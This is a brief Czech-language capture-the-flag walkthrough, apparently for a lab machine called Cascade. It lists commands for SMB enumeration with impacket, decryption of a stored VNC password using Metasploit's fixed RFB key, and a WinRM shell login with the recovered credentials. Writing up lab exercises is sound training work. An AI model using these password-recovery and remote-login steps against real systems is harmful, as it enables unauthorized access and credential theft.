### Enumerace SMB
Kontroluji SMB sdílení a hledám data, která mohou obsahovat citlivé informace.
`./impacket/examples/smbclient.py r.thompson:rY4n5eva@cascade.local`
```
=> r.thompson:rY4n5eva
```

### Spuštění exploitu
Zde dochází k praktickému zneužití zranitelnosti.
`msfconsole`
```
irb
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
=> "sT333ve2"
```

### Přihlášení na cíl
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`./evil-winrm/evil-winrm.rb -i $IP -u s.smith -p 'sT333ve2'`
